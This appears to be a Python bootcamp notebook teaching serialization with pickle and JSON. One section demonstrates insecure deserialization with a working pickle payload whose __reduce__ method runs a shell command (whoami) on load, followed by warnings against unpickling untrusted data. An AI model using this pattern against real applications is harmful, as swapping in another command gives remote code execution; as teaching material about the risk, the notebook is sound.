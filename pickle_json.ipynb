{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![NASA](http://www.nasa.gov/sites/all/themes/custom/nasatwo/images/nasa-logo.svg)\n",
    "\n",
    "<center>\n",
    "<h1><font size=\"+3\">GSFC Python Bootcamp</font></h1>\n",
    "</center>\n",
    "\n",
    "---\n",
    "<center>\n",
    "<H1 style=\"color:red\">\n",
    "Serialization and Deserialization with Python\n",
    "</H1>\n",
    "</center>\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from __future__ import print_function"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Useful References\n",
    "\n",
    "- <a href=\"https://en.wikipedia.org/wiki/Serialization\">Serialization</a> (Wikipedia)\n",
    "- <a href=\"https://mindmajix.com/python/serialization\">Serialization in python</a>\n",
    "- <a href=\"https://code.tutsplus.com/tutorials/serialization-and-deserialization-of-python-objects-part-1--cms-26183\">Serialization and Deserialization of Python Objects</a>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# <font color=\"blue\"> Serialization and Deserialization</font>\n",
    "\n",
    "> … the process of translating data structures or object state into a format that can be stored … or transmitted … and reconstructed later (possibly in a different computer environment). (Wikipedia)\n",
    "\n",
    "* **Serialization** is a process of transforming objects or data structures into byte streams or strings. \n",
    "* These byte streams can then be stored or transferred easily. \n",
    "* This allows the developers to save, for example, configuration data or user's progress, and then store it (on disk or in a database) or send it to another location.\n",
    "* The reverse process of serialization is known as **deserialization**.\n",
    "\n",
    "### Why do we need serialization?\n",
    "\n",
    "We need Serialization for the following reasons:\n",
    "\n",
    "- **Communication**: Serialization involves the procedure of object serialization and transmission. This enables multiple computer systems to design, share and execute objects simultaneously.\n",
    "- **Caching**: The time consumed in building an object is more compared to the time required for de-serializing it. Serialization minimizes time consumption by caching the giant objects.\n",
    "- **Deep Copy**: Cloning process is made simple by using Serialization. An exact replica of an object is obtained by serializing the object to a byte array, and then de-serializing it.\n",
    "- **Portability**: The major advantage of Serialization is that it works across different architectures or Operating Systems.\n",
    "- **Persistence**: The State of any object can be directly stored by applying Serialization on to it and stored in a database so that it can be retrieved later.\n",
    "\n",
    "![fig_sd](https://miro.medium.com/max/1150/1*9zJJ65xk8agiQXlqd7nYUw.jpeg)\n",
    "Image Source: Phonlawat Khunphet"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# <font color=\"blue\">Pickle</font>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=\"red\"> What is pickle?</font>\n",
    "\n",
    "* The module `pickle` is used for serializing and deserializing a Python object structure. \n",
    "* Any object in python can be pickled so that it can be saved on disk. \n",
    "* `pickle` “serialises” the object first before writing it to file. \n",
    "* Pickling (serialization) is a way to convert a python object (list, dict, etc.) into a character stream which contains all the information necessary to reconstruct the object in another python script.\n",
    "\n",
    "The following types can be serialized and deserialized using the `pickle` module:\n",
    "* All native datatypes supported by Python (booleans, None, integers, floats, complex numbers, strings, bytes, byte arrays)\n",
    "* Dictionaries, sets, lists, and tuples - as long as they contain pickleable objects\n",
    "* Functions (pickled by their name references, and not by their value) and classes that are defined at the top level of a module\n",
    "\n",
    "![fig_pickle](https://pythontic.com/python_pickle.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "## <font color=\"red\">Applications of Pickling</font>\n",
    "\n",
    "* Saving a program's state data to disk so that it can carry on where it left off when restarted (persistence)\n",
    "* Sending python data over a TCP connection in a multi-core or distributed system (marshalling)\n",
    "* Storing python objects in a database\n",
    "* Converting an arbitrary python object to a string so that it can be used as a dictionary key (e.g. for caching & memoization)\n",
    "* Machine Learning (saving <a href=\"https://pythonprogramming.net/pickle-classifier-save-nltk-tutorial/\">trained ML algorithm</a>)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=\"red\">How to Use pickle</font>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The main functions of `pickle` are:\n",
    "\n",
    "* `dump()`: saves the pickled data out to the designated file.\n",
    "* `load()`: takes a file object, reconstruct the objects from the pickled representation, and returns it.\n",
    "* `dumps()`: serializes a python object hierarchy and returns the bytes object of the serialized object. It does not deal with writing the pickled object hierarchy into a file.\n",
    "* `loads()`: reads the pickled data from a string.\n",
    "\n",
    "`dump()`/`load()` serializes/deserializes objects through files but `dumps()`/`loads()` serializes/deserializes objects through string representation."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "### Python Object Serialization\n",
    "\n",
    "The pickle module turns an arbitrary Python object into a series of bytes. This process is also called serialization. \n",
    "* Useful for storing data\n",
    "* Inter process communication"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "data_org = { 'a':'A', 'b':2, 'c':3.0 } \n",
    "print('Type: ', type(data_org))\n",
    "print('DATA:', data_org)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The `dumps()` function creates a string representation of the value of the object."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "data_string = pickle.dumps(data_org)\n",
    "print('Type: ', type(data_string))\n",
    "print('PICKLE:', data_string )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "By default, the pickle will contain only ASCII characters. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Python Object Deserialization\n",
    "\n",
    "* Once the data is serialized, you can write it to a file, socket, pipe, etc. \n",
    "* Then later you can read the file and unpickle the data to construct a new object with the same values."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Get the data back from the serialized object**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print('BEFORE: ', data_org)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The `loads()` function converts the byte like object (from the pickled string representation) to corresponding Python object."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "data2 = pickle.loads(data_string)\n",
    "print('AFTER:  ',data2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print('EQUAL?:', (data_org == data2))\n",
    "print('SAME ?:', (data_org is data2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Write pickled data to a file and Read the data back**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The `dump()` writes byte representation of supported Python object to a file. The file itself should be a **binary file with write permission**."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('pickled_data_file.pkl', 'wb') as fid:\n",
    "     pickle.dump(data_org, fid)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The `load()` function reads the byte data from a binary file and converts it to Python object."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Read the data from the file\n",
    "with open('pickled_data_file.pkl', 'rb') as fid:\n",
    "     data3 = pickle.load(fid)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print('Data Before Write:', data_org)\n",
    "print('Data After  Read :', data3)\n",
    "print('EQUAL?:', (data_org == data3))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Pickling and Unpickling Custom Objects"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Example 1**: Instance of a class"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class Planets:\n",
    "      def __init__(self, platnet_name, planet_size):\n",
    "          self.size = planet_size\n",
    "          self.name = platnet_name"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mercury = Planets('Mercury', 1516.0)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* The file is opened in binary mode for writing. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('pickle_instance.pkl', 'wb') as pickle_out:\n",
    "     pickle.dump(mercury, pickle_out)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* The file is opened in binary mode for reading. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('pickle_instance.pkl', 'rb') as pickle_in:\n",
    "     unpickled_mercury = pickle.load(pickle_in)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"Name: \", unpickled_mercury.name)\n",
    "print(\"Size: \", unpickled_mercury.size)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Example 2**: Collection of objects"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def my_func():\n",
    "    return \"my_func was called\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('pickle_objects.pkl', 'wb') as pickle_out:\n",
    "     # serialize class object\n",
    "     pickle.dump(Planets, pickle_out)\n",
    "     # serialize class instance\n",
    "     pickle.dump(Planets('Jupiter', 43441), pickle_out)\n",
    "     # serialize function object\n",
    "     pickle.dump(my_func, pickle_out)\n",
    "     # serialize complex number\n",
    "     pickle.dump(3.7 + 2.5j, pickle_out)\n",
    "     # serialize bytes object\n",
    "     pickle.dump(bytes([1, 2, 3, 4, 5]), pickle_out)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* Objects are returned in the same order in which we have pickled them in the first place. \n",
    "* When there is no more data to return, the `load()` function throws `EOFError`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('pickle_objects.pkl', 'rb') as pickle_in:\n",
    "     # deserialize class object\n",
    "     NewPlanets = pickle.load(pickle_in)\n",
    "     # deserialize class instance\n",
    "     new_jupiter = pickle.load(pickle_in)\n",
    "     # deserialize function object\n",
    "     new_func = pickle.load(pickle_in)\n",
    "     # deserialize complex number\n",
    "     new_complex = pickle.load(pickle_in)\n",
    "     # deserialize bytes object\n",
    "     new_byte = pickle.load(pickle_in)\n",
    "     pickle.load(pickle_in)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* Once you have unpickled the data you can use it like an ordinary Python object."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mercury = NewPlanets('Mercury', 1516.0)\n",
    "print(mercury.name, mercury.size)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(new_jupiter.name, new_jupiter.size)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_func()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"Complex Number: \", new_complex)\n",
    "print(\"Byte object: \", new_byte)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Application: Insecure Deserialization\n",
    "\n",
    "- This example will serialize an exploit to run the `whoami` command, and deserialize it with pickle.loads()."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile insecure_deserialization.py\n",
    "\n",
    "import os\n",
    "import getpass\n",
    "import pickle\n",
    "\n",
    "# Attacker prepares exploit that application will insecurely deserialize\n",
    "class Exploit(object):\n",
    "   def __reduce__(self):\n",
    "       \"\"\"\n",
    "         A special method that is referenced when we are serializing data. \n",
    "         The reduce function essentially tells the pickle library how to serialize the object. \n",
    "         Then, when we are unserializing the data, this information is used to rebuild the object.\n",
    "       \"\"\"\n",
    "       return (os.system, ('whoami',))\n",
    "\n",
    "# Attacker serializes the exploit\n",
    "def serialize_exploit():\n",
    "    shellcode = pickle.dumps(Exploit())\n",
    "    return shellcode\n",
    "\n",
    "# Application insecurely deserializes the attacker's serialized data\n",
    "def insecure_deserialization(exploit_code):\n",
    "    return pickle.loads(exploit_code)\n",
    "    \n",
    "if __name__ == '__main__':\n",
    "   # Serialize the exploit\n",
    "   shellcode = serialize_exploit()\n",
    "   print(\"shellcode: {}\".format(shellcode))\n",
    "\n",
    "   # Attacker's payload runs a `whoami` command\n",
    "   insecure_deserialization(shellcode)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- Imagine the above scenario in the context of a web application. \n",
    "- If you must use a native serialization format like Python’s pickle, be very careful and use it only on trusted input. \n",
    "- Never deserialize data that has travelled over a network or come from a data source or input stream that is not controlled by your application.\n",
    "- In order to significantly reduce the likelihood of introducing insecure deserialization vulnerabilities one must make use of language-agnostic methods for deserialization such as JSON, XML or YAML."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=\"red\">Conclusions</font>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Advantages**\n",
    "\n",
    "1. Helps in saving complicated data.\n",
    "2. Quite easy to use, doesn’t require several lines of code and hence not bulky.\n",
    "3. Saved data is not so readable hence provides some data security.\n",
    "\n",
    "**Disadvantages**\n",
    "\n",
    "1. Non-Python programs may not be able to reconstruct pickled Python objects.\n",
    "2. Security risks in unpickling data from malicious sources."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**When to Pickle**\n",
    "\n",
    "* Pickling is useful for applications where you need some degree of persistency in your data. Your program's state data can be saved to disk, so you can continue working on it later on. \n",
    "* It can also be used to send data over a Transmission Control Protocol (TCP) or socket connection, or to store python objects in a database. \n",
    "* Pickle is very useful for when you're working with machine learning algorithms, where you want to save them to be able to make new predictions at a later time, without having to rewrite everything or train the model all over again.\n",
    "\n",
    "**When Not to Pickle**\n",
    "\n",
    "* If you want to use data across different programming languages, pickle is not recommended. Its protocol is specific to Python, thus, cross-language compatibility is not guaranteed. \n",
    "* The same holds for different versions of Python itself. Unpickling a file that was pickled in a different version of Python may not always work properly, so you have to make sure that you're using the same version and perform an update if necessary. \n",
    "* You should also try not to unpickle data from an untrusted source. Malicious code inside the file might be executed upon unpickling."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# <font color=\"blue\">Json</font>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=\"red\"> What is JSON?</font>\n",
    "\n",
    "* JSON (JavaScript Object Notation) is a popular data format used for representing structured data. \n",
    "* It is a text format that is language independent and can be used in Python, Perl among other languages. \n",
    "* JSON format is used for data communications between servers and web applications.\n",
    "* It is built on two structures:\n",
    "\n",
    "     - A collection of name/value pairs. This is realized as an object, record, dictionary, hash table, keyed list, or associative array.\n",
    "     - An ordered list of values. This is realized as an array, vector, list, or sequence."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=\"red\">JSON Data</font>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import json"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The main functions of JSON are:\n",
    "\n",
    "- `dump()`: Takes a Python object, serializes it and writes the output (which is a JSON string) to a file like object.\n",
    "- `load()`: Deserializes the JSON object from the file like object and returns it.\n",
    "- `dumps()`: Converts a Python datastructure to a JSON string\n",
    "- `loads()`: Convert JSON data into Python data."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Example of JSON Data**\n",
    "\n",
    "```python\n",
    "{\n",
    "    \"stations\": [\n",
    "        {\n",
    "            \"acronym\": “BLD”, \n",
    "            \"name\": \"Boulder Colorado\",\n",
    "            \"latitude”: 40.00,\n",
    "            \"longitude”: -105.25\n",
    "        }, \n",
    "        {\n",
    "            \"acronym”: “BHD”, \n",
    "            \"name\": \"Baring Head Wellington New Zealand\",\n",
    "            \"latitude\": -41.28,\n",
    "            \"longitude\": 174.87\n",
    "        }\n",
    "    ]\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Another Example of JSON Data**\n",
    "\n",
    "We consider an online database, <a href=\"IP-API.com\">IP-API.com</a>, that returns GeoIP data in JSON format. Simply opening <a href=\"http://ip-api.com/json/54.148.84.95\">http://ip-api.com/json/54.148.84.95</a> will return the following JSON result:\n",
    "\n",
    "\n",
    "```python\n",
    "{\n",
    "  \"as\": \"AS16509 Amazon.com, Inc.\",\n",
    "  \"city\": \"Boardman\",\n",
    "  \"country\": \"United States\",\n",
    "  \"countryCode\": \"US\",\n",
    "  \"isp\": \"Amazon\",\n",
    "  \"lat\": 45.8696,\n",
    "  \"lon\": -119.688,\n",
    "  \"org\": \"Amazon\",\n",
    "  \"query\": \"54.148.84.95\",\n",
    "  \"region\": \"OR\",\n",
    "  \"regionName\": \"Oregon\",\n",
    "  \"status\": \"success\",\n",
    "  \"timezone\": \"America\\/Los_Angeles\",\n",
    "  \"zip\": \"97818\"\n",
    "}\n",
    "```\n",
    "\n",
    "To see your own Geolocation data in JSON format, just open <a href=\"http://ip-api.com/json/\">http://ip-api.com/json/</a>."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ The text in JSON is done through quoted string which contains value in key-value mapping within `{` `}`.\n",
    "+ JSON data representation is very similar to Python dictionaries.\n",
    "+ It supports primitive types, like strings and numbers, as well as nested lists and objects"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=\"red\">Convert Python Data Types into JSON </font>\n",
    "\n",
    "Python objects and their equivalent conversion to JSON.\n",
    "\n",
    "| Python | JSON Equivalent |\n",
    "| --- | ---  |\n",
    "| `dict` | object |\n",
    "| `list`, `tuple` | array |\n",
    "| `str` | string |\n",
    "| `int`, `float` | number |\n",
    "| `True` | true |\n",
    "| `False` | false |\n",
    "| `None` | null |"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"Dictionary: \", json.dumps({\"name\": \"John\", \"age\": 30}))\n",
    "print(\"List:       \", json.dumps([\"apple\", \"bananas\"]))\n",
    "print(\"Tuple:      \", json.dumps((\"apple\", \"bananas\")))\n",
    "print(\"String:     \", json.dumps(\"hello\"))\n",
    "print(\"Integer:    \", json.dumps(42))\n",
    "print(\"Float:      \", json.dumps(31.76))\n",
    "print(\"True:       \", json.dumps(True))\n",
    "print(\"False:      \", json.dumps(False))\n",
    "print(\"None:       \", json.dumps(None))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Convert JSON to Python Object (Dict)**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "json_data = '{\"acronym\": \"BLD\", \\\n",
    "              \"name\": \"Boulder Colorado\", \\\n",
    "              \"latitude\": 40.00,  \\\n",
    "              \"longitude\": -105.25}'\n",
    "python_obj = json.loads(json_data)\n",
    "print(\"Name:     \", python_obj[\"name\"])\n",
    "print(\"Acronym:  \", python_obj[\"acronym\"])\n",
    "print(\"Latitude: \", python_obj[\"latitude\"])\n",
    "print(\"Latitude: \", python_obj[\"longitude\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(json.dumps(python_obj, sort_keys=True, indent=4))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Convert JSON to Python Object (List)**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "array = '{\"drinks\": [\"coffee\", \"tea\", \"water\"]}'\n",
    "data = json.loads(array)\n",
    "\n",
    "print(json.dumps(data, sort_keys=True, indent=4))\n",
    "print()\n",
    "for element in data[\"drinks\"]:\n",
    "    print(element)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Convert JSON to Python Object**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "json_input = '{\"stations\": [{\"acronym\": \"BLD\", \\\n",
    "                                \"name\": \"Boulder Colorado\", \\\n",
    "                            \"latitude\": 40.00, \\\n",
    "                            \"longitude\": -105.25}, \\\n",
    "                            {\"acronym\": \"BHD\", \\\n",
    "                             \"name\": \"Baring Head Wellington New Zealand\",\\\n",
    "                             \"latitude\": -41.28, \\\n",
    "                             \"longitude\": 174.87}]}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "decoded = json.loads(json_input)\n",
    "for x in decoded['stations']:\n",
    "    print(x[\"name\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(json.dumps(decoded, sort_keys=True, indent=4))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Convert Python Object (Dict) to JSON**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "d = {}\n",
    "d[\"name\"] = \"Boulder Colorado\"\n",
    "d[\"acronym\"] = \"BLD\"\n",
    "d[\"latitude\"] = 40.00\n",
    "d[\"longitude\"] = -105.25\n",
    "d_js = json.dumps(d, ensure_ascii=False)\n",
    "print(d_js)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Convert Python Objects into JSON**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "x = {\n",
    "  \"name\": \"John\",\n",
    "  \"age\": 30,\n",
    "  \"married\": True,\n",
    "  \"divorced\": False,\n",
    "  \"children\": (\"Ann\",\"Billy\"),\n",
    "  \"pets\": None,\n",
    "  \"cars\": [\n",
    "    {\"model\": \"BMW 230\", \"mpg\": 27.5},\n",
    "    {\"model\": \"Ford Edge\", \"mpg\": 24.1}\n",
    "  ]\n",
    "}\n",
    "\n",
    "print(\"Python Object: \\n\\t\", x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for key in x:\n",
    "    print(\"{}:\\t {}\".format(key, x[key]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "x_js = json.dumps(x)\n",
    "print(\"Corresponding JSON Object: \\n\\t\", x_js)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Going Back to Python:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "y = json.loads(x_js)\n",
    "for key in y:\n",
    "    print(key+\":\\t\", y[key])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Convert Python String to JSON**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "json_string = \"\"\"\n",
    "{\n",
    "    \"researcher\": {\n",
    "        \"name\": \"Ford Prefect\",\n",
    "        \"species\": \"Betelgeusian\",\n",
    "        \"relatives\": [\n",
    "            {\n",
    "                \"name\": \"Zaphod Beeblebrox\",\n",
    "                \"species\": \"Betelgeusian\"\n",
    "            }\n",
    "        ]\n",
    "    }\n",
    "}\n",
    "\"\"\"\n",
    "data = json.loads(json_string)\n",
    "print(json.dumps(data, sort_keys=True, indent=4))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=\"red\"> Serialization and Deserialization</font>\n",
    "\n",
    "**Serialization**\n",
    "\n",
    "We use the `dump()` that takes two arguments: \n",
    "* The data object to be serialized.\n",
    "* The file object to which it will be written."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "file_name = \"Sample.json\"\n",
    "with open(file_name, \"w\") as fid: \n",
    "     json.dump(x, fid)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The file object does not have to be a traditional file, any file pointer will work."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "json.dump(x, sys.stdout)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Deserializing JSON**\n",
    "\n",
    "* The Deserialization is opposite of Serialization, i.e. conversion of JSON object into their respective Python objects. \n",
    "* We use the `load()` function which is usually used to load from string, otherwise the root object is in list or dict."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(file_name, \"r\") as fid: \n",
    "     z = json.load(fid)\n",
    "        \n",
    "print(z)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for key in z:\n",
    "    print(key+\":\\t\", z[key])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Example**\n",
    "\n",
    "Consider the following JSON data (from NASA's Astronomy Picture of the Day API) that we write in a file named `apod.json`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile apod.json\n",
    "{\n",
    "    \"media_type\": \"image\",\n",
    "    \"copyright\": \"Yin Hao\",\n",
    "    \"date\": \"2018-10-30\",\n",
    "    \"url\": \"https://apod.nasa.gov/apod/image/1810/Orionids_Hao_960.jpg\",\n",
    "    \"explanation\": \"Meteors have been shooting out from the constellation of Orion. This was expected, as October is the time of year for the Orionids Meteor Shower.  Pictured here, over two dozen meteors were caught in successively added exposures last October over Wulan Hada volcano in Inner Mongolia, China. The featured image shows multiple meteor streaks that can all be connected to a single small region on the sky called the radiant, here visible just above and to the left of the belt of Orion, The Orionids meteors started as sand sized bits expelled from Comet Halley during one of its trips to the inner Solar System. Comet Halley is actually responsible for two known meteor showers, the other known as the Eta Aquarids and visible every May. An Orionids image featured on APOD one year ago today from the same location shows the same car. Next month, the Leonids Meteor Shower from Comet Tempel-Tuttle should also result in some bright meteor streaks. Follow APOD on: Facebook, Instagram, Reddit, or Twitter\",\n",
    "    \"hdurl\": \"https://apod.nasa.gov/apod/image/1810/Orionids_Hao_2324.jpg\",\n",
    "    \"title\": \"Orionids Meteors over Inner Mongolia\",\n",
    "    \"service_version\": \"v1\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Read the file:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"apod.json\", \"r\") as f:\n",
    "    json_text = f.read()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Decode the JSON string into a Python dictionary:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "apod_dict = json.loads(json_text)\n",
    "print(apod_dict['explanation'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Encode the Python dictionary into a JSON string:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_json_string = json.dumps(apod_dict, indent=6)\n",
    "print(new_json_string)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_json_string = json.dumps(apod_dict, indent=6, sort_keys=True)\n",
    "print(new_json_string)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=\"red\">Conclusion</font>\n",
    "\n",
    "* JSON is standardized and language-independent (while `pickle` is specific to Python).\n",
    "* It is more secure and much faster than `pickle`.\n",
    "* If you only need to use Python, then the `pickle` module is still a good choice for its ease of use and ability to reconstruct complete Python objects."
   ]
  }
 ],
 "metadata": {
  "anaconda-cloud": {},
  "celltoolbar": "Raw Cell Format",
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
